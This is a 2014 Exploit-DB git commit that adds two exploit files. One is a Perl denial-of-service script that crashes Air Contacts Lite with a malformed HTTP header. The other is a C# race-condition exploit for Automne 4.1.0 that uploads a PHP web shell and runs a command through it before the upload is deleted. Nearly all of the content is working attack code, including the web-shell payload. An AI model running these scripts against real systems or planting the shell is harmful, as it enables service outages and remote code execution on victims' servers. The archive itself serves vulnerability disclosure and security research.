5a0a6520d23da3ccc27d82ccad198fddf18cb49c
Offensive Security <info@exploit-db.com>
2014-12-03 04:52:35 +0000

    Updated 12_03_2014

---
+++ platforms/multiple/dos/35437.pl
@@ -0,0 +1,29 @@
+source: http://www.securityfocus.com/bid/46827/info
+
+Air Contacts Lite is prone a denial-of-service vulnerability.
+
+Successful exploits may allow an attacker to crash the affected application, resulting in a denial-of-service condition. 
+
+#!/usr/bin/perl
+use IO::Socket;
+      if (@ARGV < 1) {
+              usage();
+      }
+      $ip     = $ARGV[0];
+      $port   = $ARGV[1];
+      print "[+] Sending request...\n";
+      $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr =>
+"$ip", PeerPort => "$port") || die "[-] Connection FAILED!\n";
+      print $socket "GET http://www.example.com. HTTP/1.1\r\n";
+      print $socket "Host: http://www.example.com.\r\n";
+      print $socket "Content-Length: 0\x78\x41\x71\x69\r\n\r\n";
+      sleep(2);
+      close($socket);
+      print "[+] Done!\n";
+
+sub usage() {
+      print "[-] example - Air Contacts Lite (DoS)\n\n";
+      print "[-] Usage: <". $0 ."> <host> <port>\n";
+      print "[-] Example: ". $0 ." 127.0.0.1 80\n";
+      exit;
+}
---
+++ platforms/php/webapps/35417.php
@@ -0,0 +1,145 @@
+source: http://www.securityfocus.com/bid/46774/info
+
+Automne is prone to an arbitrary-file-upload vulnerability.
+
+An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application.
+
+Automne 4.1.0 is vulnerable; other versions may also be affected. 
+
+Home Software Services Advisories Contact
+Automne 4.1.0 Race Condition
+
+// ------------------------------------------------------------------------
+// Software................Automne 4.1.0
+// Vulnerability...........Race Condition
+// Threat Level............Very Critical (5/5)
+// Download................http://en.automne-cms.org/
+// Release Date............3/6/2011
+// Tested On...............Windows Vista + XAMPP
+// ------------------------------------------------------------------------
+// Author..................AutoSec Tools
+// Site....................http://www.autosectools.com/
+// Email...................John Leitch <john@autosectools.com>
+// ........................Bryce Darling <bryce@autosectools.com>
+// ------------------------------------------------------------------------
+// 
+// 
+// --Description--
+// 
+// A race condition in Automne 4.1.0 can be exploited to bypass
+// validation performed on uploaded files. The following proof of concept
+// uploads a PHP script and then attempts to execute it before it is deleted.
+// 
+// 
+// --PoC--
+
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Threading;
+using System.Diagnostics;
+using System.Net.Sockets;
+
+namespace RaceConditionExploit
+{
+    class Program
+    {
+        static bool trying = true;
+
+        static void SendReq(string req)
+        {
+            try
+            {
+                var bytes = ASCIIEncoding.ASCII.GetBytes(req);
+                var client = new TcpClient();
+                client.Connect("localhost", 80);
+                using (var stream = client.GetStream())
+                    stream.Write(bytes, 0, bytes.Length);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex);
+            }
+        }
+
+        static void CheckForCalc()
+        {
+            if (Process.GetProcessesByName("calc").Length != 0)
+                trying = false;
+        }
+
+        static void Main()
+        {
+            
+
+            var resets = new[]
+            {
+                new ManualResetEvent(false),
+                new ManualResetEvent(false),
+                new ManualResetEvent(false),
+            };
+
+            ThreadPool.QueueUserWorkItem(x =>
+            {
+                resets[0].WaitOne();
+
+                while (trying)
+                {
+                    SendReq(@"POST /automne/automne/admin/upload-controler.php?atm-regen=shell.php HTTP/1.1
+Host: localhost
+Proxy-Connection: keep-alive
+User-Agent: x
+Content-Length: 193
+Cache-Control: max-age=0
+Origin: null
+Content-Type: multipart/form-data; boundary=----x
+Accept: text/html
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+
+------x
+Content-Disposition: form-data; name=""Filedata""; filename=""shell.php""
+Content-Type: application/octet-stream
+
+<?php echo '<pre>' + system($_GET['CMD']) + '</pre>'; ?>
+------x--
+
+");
+                    CheckForCalc();                    
+                }
+                resets[1].Set();
+            });
+
+            ThreadPool.QueueUserWorkItem(x =>
+            {
+                resets[0].WaitOne();
+
+                while (trying)
+                {
+                    SendReq(@"GET http://localhost/automne/automne/upload/shell.php?CMD=calc.exe HTTP/1.1
+Host: localhost
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.119 Safari/534.16
+Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+Cookie: PHPSESSID=poiued4lsn8im03kb80t6131n3; osclass=9aae23cu0mqtopjv126loiu9n6; AutomneSession=mo70c3rth2qboupjpfbo010gv0
+
+");
+                    CheckForCalc();
+                }
+
+                resets[2].Set();
+            });
+
+            resets[0].Set();
+
+            resets[1].WaitOne();
+            resets[2].WaitOne();
+        }
+    }
+}
+
